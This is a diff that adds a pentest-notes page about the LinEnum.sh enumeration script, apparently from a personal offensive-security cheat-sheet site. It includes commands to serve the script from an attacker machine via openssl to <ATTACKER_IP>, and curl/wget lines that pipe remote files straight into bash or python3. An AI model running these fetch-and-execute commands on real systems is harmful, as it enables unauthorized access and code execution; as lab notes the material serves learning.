@@ -1,0 +1,62 @@
+---
+title: "LinEnum.sh"
+sidebarTitle: "LinEnum.sh"
+description: "Commands and examples collected from your LinEnum.sh notes."
+keywords: ["LinEnum.sh"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/linenum.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=linenum) · [All tools](/index)
+
+## Tools
+
+**Notebook example**
+
+```powershell
+./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="Linux LOLBins">
+
+### Linux LOLBins
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On attacker — create cert and start server
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+
+# On target — download
+openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
+```
+
+</Accordion>
+
+<Accordion title="wget and cURL">
+
+### wget and cURL
+
+**File Transfers for Linux and Windows**
+
+```bash
+curl http://<IP>/LinEnum.sh | bash                      # download and execute without saving
+wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = output to stdout
+```
+
+</Accordion>
+
+</AccordionGroup>
